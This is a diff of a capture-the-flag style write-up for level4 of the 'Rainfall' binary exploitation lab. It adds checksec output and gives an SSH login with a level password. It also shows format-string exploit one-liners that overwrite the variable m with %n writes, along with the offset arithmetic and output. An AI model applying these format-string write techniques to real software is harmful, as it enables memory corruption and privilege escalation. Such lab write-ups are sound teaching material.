@@ -1,8 +1,17 @@
 Login as `level4`.
 ```shell
-┌──$ [~/42/2021/rainfall]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.1.28 -p 4242 -l level4
 level4@192.168.1.28's password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
 ```
 A `SUID` executable is located in the home directory.
 ```shell
@@ -37,14 +46,15 @@ level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%016930112x%12$n"' | .
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
 
-The second one, is more creative and faster. It consit in writing in each byte of variable `m` which is lay between `0x08049810` to `0x08049813`.
-First of all, those byte addresses where values should be written are putted on stack. Then, the value which should be written is divided by bytes `0x44`, `0x55`, `0x02`, `0x01`. It is done to calculate an offset for each value. This offest value would be a number which will be written in carefully-selected address. As addresses were placed previously, they can be selected using direct parameter access `$`.
+The second one, is more creative and faster. It consist in writing in each byte of variable `m` which is lay between `0x08049810` to `0x08049813`.
+First of all, those byte addresses where values should be written are putted on stack. Then, the value which should be written is divided by bytes `0x44`, `0x55`, `0x02`, `0x01`. It is done to calculate an offset for each value. This offset value would be a number which will be written in carefully-selected address. As addresses were placed previously, they can be selected using direct parameter access `$`.
 
-0x44 = 68   | 4+4+4+4+x             = 68  (0x44)  : x = 52
-0x55 = 85   | 4+4+4+4+52+x          = 85  (0x55)  : x = 17
-0x02 = 2    | 4+4+4+4+52+17+x       = 258 (0x102) : x = 173
-0x01 = 1    | 4+4+4+4+52+17+173+x   = 513 (0x201) : x = 255
+> `0x44 = 68   | 4+4+4+4+x             = 68  (0x44)  : x = 52` <br>
+> `0x55 = 85   | 4+4+4+4+52+x          = 85  (0x55)  : x = 17` <br>
+> `0x02 = 2    | 4+4+4+4+52+17+x       = 258 (0x102) : x = 173` <br>
+> `0x01 = 1    | 4+4+4+4+52+17+173+x   = 513 (0x201) : x = 255` <br>
 
+Exploit and log on to the next level.
 ```shell
 level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "\x12\x98\x04\x08" + "\x13\x98\x04\x08" + "%052x%12$n" + "%017x%13$n" + "%0173x%14$n" + "%0255x%15$n"' | ./level4
 00000000000000000000000000000000000000000000b7ff26b0000000000bffff794000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b7fd0ff4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
